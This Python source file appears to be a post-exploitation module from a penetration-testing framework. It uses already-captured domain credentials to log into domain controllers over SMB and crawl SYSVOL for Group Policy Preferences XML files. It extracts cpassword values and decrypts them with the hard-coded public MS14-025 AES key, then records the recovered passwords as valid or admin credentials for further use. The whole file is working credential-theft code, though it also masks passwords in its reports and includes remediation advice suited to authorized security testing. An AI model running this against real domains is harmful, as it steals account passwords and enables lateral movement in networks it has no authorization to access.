"""Group Policy Preferences password extraction (MS14-025).

Connects to the SYSVOL share on a Domain Controller and searches for
XML files containing ``cpassword`` attributes.  These are AES-256-CBC
encrypted with a key that Microsoft publicly documented, making
decryption trivial.

Based on the technique from MS14-025 / Get-GPPPassword.
"""

from __future__ import annotations

import asyncio
import base64
import contextlib
import logging
import re
from typing import TYPE_CHECKING, Any

from pacdoor.core.models import (
    Credential,
    CredentialType,
    Evidence,
    ExploitSafety,
    Finding,
    Phase,
    Severity,
)
from pacdoor.modules.base import BaseModule

if TYPE_CHECKING:
    from pacdoor.modules.base import ModuleContext

log = logging.getLogger(__name__)

# ── Lazy import for impacket ─────────────────────────────────────────

_impacket_available: bool | None = None


def _ensure_impacket() -> bool:
    global _impacket_available  # noqa: PLW0603
    if _impacket_available is not None:
        return _impacket_available
    try:
        import impacket.smbconnection  # type: ignore[import-untyped]  # noqa: F401
        _impacket_available = True
    except ImportError:
        log.debug("impacket not installed — GPP extraction unavailable")
        _impacket_available = False
    return _impacket_available


# ── GPP AES key (publicly known since MS14-025) ─────────────────────

# This is the AES-256-CBC key Microsoft published for cpassword
# decryption.  It has been public since 2014.
_GPP_AES_KEY: bytes = (
    b"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9"
    b"\xfa\xf4\x93\x10\x62\x0f\xfe\xe8"
    b"\xf4\x96\xe8\x06\xcc\x05\x79\x90"
    b"\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
)

# Null IV for AES-256-CBC.
_GPP_AES_IV: bytes = b"\x00" * 16

# XML files that may contain cpassword attributes.
_GPP_XML_FILES: list[str] = [
    "Groups.xml",
    "Services.xml",
    "ScheduledTasks.xml",
    "DataSources.xml",
    "Printers.xml",
    "Drives.xml",
]

# Regex to extract cpassword and userName from GPP XML.
_CPASSWORD_RE = re.compile(r'cpassword="([^"]+)"', re.IGNORECASE)
_USERNAME_RE = re.compile(r'userName="([^"]*)"', re.IGNORECASE)
_NEWNAME_RE = re.compile(r'newName="([^"]*)"', re.IGNORECASE)
_RUNASUSER_RE = re.compile(r'runAs="([^"]*)"', re.IGNORECASE)


# ── Decryption ───────────────────────────────────────────────────────

def _decrypt_cpassword(cpassword: str) -> str | None:
    """Decrypt a GPP cpassword using the publicly known AES key.

    Returns the plaintext password, or None on failure.
    """
    try:
        from cryptography.hazmat.primitives import padding as sym_padding
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

        # cpassword is base64-encoded (with possible padding adjustments)
        # Microsoft sometimes omits trailing '=' padding
        padded = cpassword + "=" * (4 - len(cpassword) % 4) if len(cpassword) % 4 else cpassword
        encrypted = base64.b64decode(padded)

        cipher = Cipher(algorithms.AES(_GPP_AES_KEY), modes.CBC(_GPP_AES_IV))
        decryptor = cipher.decryptor()
        decrypted_padded = decryptor.update(encrypted) + decryptor.finalize()

        # Remove PKCS7 padding
        unpadder = sym_padding.PKCS7(128).unpadder()
        decrypted = unpadder.update(decrypted_padded) + unpadder.finalize()

        return decrypted.decode("utf-16le").rstrip("\x00")
    except ImportError:
        log.debug("cryptography library not available — trying pycryptodome")
    except Exception as e:
        log.debug("GPP decrypt with cryptography failed: %s", e)

    # Fallback: try pycryptodome
    try:
        from Crypto.Cipher import AES as CryptoAES  # type: ignore[import-untyped]

        padded = cpassword + "=" * (4 - len(cpassword) % 4) if len(cpassword) % 4 else cpassword
        encrypted = base64.b64decode(padded)

        cipher = CryptoAES.new(_GPP_AES_KEY, CryptoAES.MODE_CBC, _GPP_AES_IV)
        decrypted_padded = cipher.decrypt(encrypted)

        # Remove PKCS7 padding
        pad_len = decrypted_padded[-1]
        if isinstance(pad_len, int) and 1 <= pad_len <= 16:
            decrypted = decrypted_padded[:-pad_len]
        else:
            decrypted = decrypted_padded

        return decrypted.decode("utf-16le").rstrip("\x00")
    except ImportError:
        log.debug("pycryptodome not available either — GPP decrypt impossible")
    except Exception as e:
        log.debug("GPP decrypt with pycryptodome failed: %s", e)

    return None


# ── SMB helpers (synchronous — run via asyncio.to_thread) ────────────

def _connect_smb(
    ip: str,
    username: str,
    password: str,
    domain: str = "",
    ntlm_hash: str | None = None,
) -> Any | None:
    """Establish SMB connection to the target."""
    try:
        from impacket.smbconnection import SMBConnection  # type: ignore[import-untyped]

        conn = SMBConnection(ip, ip, sess_port=445)
        conn.negotiateSession()

        if ntlm_hash:
            lm, nt = "", ntlm_hash
            if ":" in ntlm_hash:
                lm, nt = ntlm_hash.split(":", 1)
            conn.login(username, "", domain, lmhash=lm, nthash=nt)
        else:
            conn.login(username, password, domain)

        return conn
    except Exception as e:
        log.debug("GPP: SMB connection to %s failed: %s", ip, e)
        return None


def _search_sysvol(
    conn: Any,
    domain: str,
) -> list[dict[str, str]]:
    """Search SYSVOL for XML files containing cpassword.

    Returns a list of dicts with keys: username, cpassword, file_path, xml_type.
    """
    results: list[dict[str, str]] = []

    share = "SYSVOL"
    base_paths = [
        f"{domain}/Policies",
    ]

    try:
        # List shares to confirm SYSVOL is accessible
        shares = conn.listShares()
        share_names = [s["shi1_netname"].rstrip("\x00") for s in shares]
        if share not in share_names:
            log.debug("GPP: SYSVOL share not found on target (shares: %s)", share_names)
            return results
    except Exception as e:
        log.debug("GPP: failed to list shares: %s", e)
        return results

    for base_path in base_paths:
        try:
            _walk_sysvol(conn, share, base_path, results)
        except Exception as e:
            log.debug("GPP: error walking %s: %s", base_path, e)

    return results


def _walk_sysvol(
    conn: Any,
    share: str,
    path: str,
    results: list[dict[str, str]],
    depth: int = 0,
) -> None:
    """Recursively walk SYSVOL directories looking for GPP XML files."""
    if depth > 10:  # Safety cap on recursion depth
        return

    try:
        entries = conn.listPath(share, path + "/*")
    except Exception:
        return

    for entry in entries:
        name = entry.get_longname()
        if name in (".", ".."):
            continue

        full_path = f"{path}/{name}"

        if entry.is_directory():
            _walk_sysvol(conn, share, full_path, results, depth + 1)
        elif name in _GPP_XML_FILES:
            # Read the file and search for cpassword
            try:
                from io import BytesIO
                buf = BytesIO()
                conn.getFile(share, full_path, buf.write)
                content = buf.getvalue().decode("utf-8", errors="replace")

                cpassword_matches = _CPASSWORD_RE.findall(content)
                if not cpassword_matches:
                    continue

                # Extract associated username
                username_match = (
                    _USERNAME_RE.search(content)
                    or _NEWNAME_RE.search(content)
                    or _RUNASUSER_RE.search(content)
                )
                username = username_match.group(1) if username_match else "unknown"

                for cpassword in cpassword_matches:
                    if not cpassword.strip():
                        continue
                    results.append({
                        "username": username,
                        "cpassword": cpassword,
                        "file_path": full_path,
                        "xml_type": name,
                    })
            except Exception as e:
                log.debug("GPP: error reading %s: %s", full_path, e)


def _disconnect_smb(conn: Any) -> None:
    """Close SMB connection."""
    with contextlib.suppress(Exception):
        conn.close()


# ── Module ───────────────────────────────────────────────────────────


class GppExtractModule(BaseModule):
    """Group Policy Preferences password extraction from SYSVOL."""

    name = "post.gpp_extract"
    description = "Extract and decrypt GPP passwords from SYSVOL (MS14-025)"
    phase = Phase.POST_EXPLOIT
    attack_technique_ids = ["T1552.006"]
    required_facts = ["service.smb", "credential.valid"]
    produced_facts = ["credential.valid", "credential.admin"]
    safety = ExploitSafety.SAFE

    async def check(self, ctx: ModuleContext) -> bool:
        """Verify impacket is available and required facts exist."""
        if not _ensure_impacket():
            return False
        return await super().check(ctx)

    async def run(self, ctx: ModuleContext) -> list[Finding]:
        findings: list[Finding] = []

        if not _ensure_impacket():
            return findings

        # ── Resolve valid domain credentials ─────────────────────────
        valid_creds = await ctx.facts.get_all("credential.valid")
        if not valid_creds:
            return findings

        # ── Resolve SMB service hosts (likely DCs) ───────────────────
        smb_facts = await ctx.facts.get_all("service.smb")
        seen_hosts: set[str] = set()

        for smb_fact in smb_facts:
            host_id = smb_fact.host_id
            if host_id is None or host_id in seen_hosts:
                continue
            seen_hosts.add(host_id)

            ip = await self.resolve_ip(ctx, host_id)
            if ip is None:
                continue

            # Try each valid credential against this host
            for cred_fact in valid_creds:
                cred = cred_fact.value
                username = (
                    cred.username if hasattr(cred, "username")
                    else str(cred.get("username", ""))
                )
                password = (
                    cred.value if hasattr(cred, "value")
                    else str(cred.get("value", ""))
                )
                domain = (
                    cred.domain if hasattr(cred, "domain")
                    else str(cred.get("domain", ""))
                )

                if not username:
                    continue

                # Check for NTLM hash auth
                ntlm_hash: str | None = None
                cred_type = (
                    str(cred.cred_type) if hasattr(cred, "cred_type")
                    else str(cred.get("cred_type", ""))
                )
                if "ntlm" in cred_type.lower():
                    ntlm_hash = password
                    password = ""

                await ctx.rate_limiter.acquire()

                conn = await asyncio.to_thread(
                    _connect_smb, ip, username, password, domain or "", ntlm_hash,
                )
                if conn is None:
                    continue

                try:
                    gpp_results = await asyncio.to_thread(
                        _search_sysvol, conn, domain or "",
                    )

                    for gpp in gpp_results:
                        plaintext = _decrypt_cpassword(gpp["cpassword"])
                        if plaintext is None:
                            # Could not decrypt — still report the finding
                            findings.append(Finding(
                                title=(
                                    f"GPP cpassword found but decrypt failed: "
                                    f"{gpp['username']}"
                                ),
                                description=(
                                    f"Found a cpassword attribute for user "
                                    f"'{gpp['username']}' in {gpp['file_path']} "
                                    f"({gpp['xml_type']}) on {ip}, but decryption "
                                    f"failed (missing cryptography library)."
                                ),
                                severity=Severity.HIGH,
                                host_id=host_id,
                                module_name=self.name,
                                attack_technique_ids=["T1552.006"],
                                evidence=[
                                    Evidence(kind="gpp_file", data=gpp["file_path"]),
                                    Evidence(kind="gpp_user", data=gpp["username"]),
                                    Evidence(kind="gpp_xml_type", data=gpp["xml_type"]),
                                ],
                                remediation=(
                                    "Delete all GPP XML files containing cpassword "
                                    "attributes from SYSVOL. Apply KB2962486 (MS14-025). "
                                    "Rotate all passwords that were stored in GPP."
                                ),
                            ))
                            continue

                        # Successfully decrypted — CRITICAL finding
                        new_cred = Credential(
                            host_id=host_id,
                            username=gpp["username"],
                            cred_type=CredentialType.PASSWORD,
                            value=plaintext,
                            domain=domain or None,
                            source_module=self.name,
                            valid=True,
                        )

                        await ctx.facts.add(
                            "credential.valid", new_cred, self.name,
                            host_id=host_id,
                        )

                        # Check if this is an admin account
                        gpp_user_lower = gpp["username"].lower()
                        if any(
                            kw in gpp_user_lower
                            for kw in ("admin", "svc", "service", "da-", "sa-")
                        ):
                            new_cred.admin = True
                            await ctx.facts.add(
                                "credential.admin", new_cred, self.name,
                                host_id=host_id,
                            )

                        if ctx.db is not None:
                            await ctx.db.insert_credential(new_cred)

                        finding = Finding(
                            title=(
                                f"GPP password decrypted: {gpp['username']}"
                            ),
                            description=(
                                f"Decrypted the GPP cpassword for user "
                                f"'{gpp['username']}' found in "
                                f"{gpp['file_path']} ({gpp['xml_type']}) on "
                                f"DC {ip}. The AES key used to encrypt GPP "
                                f"passwords was published by Microsoft in "
                                f"MS14-025, making decryption trivial. This "
                                f"password may grant access to additional "
                                f"systems and services."
                            ),
                            severity=Severity.CRITICAL,
                            host_id=host_id,
                            module_name=self.name,
                            attack_technique_ids=["T1552.006"],
                            evidence=[
                                Evidence(kind="gpp_user", data=gpp["username"]),
                                Evidence(
                                    kind="gpp_password",
                                    data=(
                                        f"{plaintext[:2]}"
                                        f"{'*' * (len(plaintext) - 2)}"
                                    ),
                                ),
                                Evidence(kind="gpp_file", data=gpp["file_path"]),
                                Evidence(kind="gpp_xml_type", data=gpp["xml_type"]),
                                Evidence(kind="gpp_dc", data=ip),
                            ],
                            remediation=(
                                "Delete all GPP XML files containing cpassword "
                                "attributes from SYSVOL. Apply KB2962486 "
                                "(MS14-025). Rotate all passwords that were "
                                "stored in GPP. Use LAPS for local admin "
                                "password management instead."
                            ),
                            verified=True,
                        )
                        findings.append(finding)

                        if ctx.db is not None:
                            await ctx.db.insert_finding(finding)

                    if gpp_results:
                        # Found GPP data — no need to try more creds on this host
                        break

                finally:
                    await asyncio.to_thread(_disconnect_smb, conn)

        return findings
